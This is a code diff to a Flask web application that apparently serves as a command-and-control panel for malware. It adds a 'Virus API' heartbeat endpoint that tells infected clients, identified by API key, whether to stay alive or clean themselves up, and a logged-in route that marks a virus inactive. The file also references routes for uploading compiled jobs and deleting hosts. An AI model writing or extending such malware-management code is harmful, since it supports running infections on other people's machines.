@@ -1,3 +1,4 @@
+# Note for API, for now internal calls on the webpage will be using /function, while externals will be using /api/function 
 import requests
 import base64
 from flask import Blueprint, render_template, request, flash, jsonify, send_file, redirect, url_for, session
@@ -156,6 +157,38 @@ def uploadCompiledJob():
     except Exception as e:
         print(f"Error uploading compiled job: {e}")
         return jsonify({'message': 'Error occurred while uploading compiled job'}), 500
+    
+
+#############################
+#####    Virus API    ######
+#############################
+    
+# API to handle heartbeat ask from virus, if the virus is set to is_alive = False, the virus will clean it self up
+@api.route('/api/heartbeat', methods=['GET', 'POST'])
+def heartbeat():
+    try:
+        # Retrieve the API key from the request
+        virus_api = request.headers.get('Authorization')
+        print(virus_api)
+
+        if not virus_api:
+            return jsonify({'message': 'Authorization header missing'}), 400
+
+        # Check if the virus exists with the provided API key
+        virus = Virus.query.filter_by(virus_api=virus_api).first()
+
+        if not virus:
+            return jsonify({'message': 'Invalid API key'}), 404
+
+        # Check the is_alive status
+        if virus.is_alive:
+            return jsonify({'message': 'Virus is alive', 'is_alive': 'True'}), 200
+        else:
+            return jsonify({'message': 'Virus is not alive. Clean up required.', 'is_alive': 'False'}), 200
+
+    except Exception as e:
+        print(f"Error in heartbeat: {e}")
+        return jsonify({'message': 'Internal server error'}), 500
 
 
 #############################
@@ -631,6 +664,39 @@ def deleteHost():
         return jsonify({'message': e})
     else:
         return jsonify({'message': 'token not valid'})
+
+
+################################
+######    UPDATE APIS    #######
+################################
+    
+# Sets the virus to is_alive = False
+@api.route('/setinactive', methods=['POST'])
+@login_required
+def setInactive():
+
+    try:
+        # Retrieve the virus ID from the request form data
+        virus_id = request.form.get('virus_id')
+
+        if not virus_id:
+            return jsonify({'message': 'Virus ID is required'}), 400
+
+        # Query the virus associated with the current user
+        virus = Virus.query.filter_by(id=virus_id, user_id=current_user.id).first()
+
+        if not virus:
+            return jsonify({'message': 'Virus not found or unauthorized'}), 404
+
+        # Update the is_alive attribute
+        virus.is_alive = False
+        db.session.commit()
+
+        return jsonify({'message': f'Virus {virus.name} has been marked as inactive.', 'status': 'success'}), 200
+
+    except Exception as e:
+        print(f"Error in set_inactive: {e}")
+        return jsonify({'message': 'Internal server error'}), 500    
 
 
 ########## Testing area ############
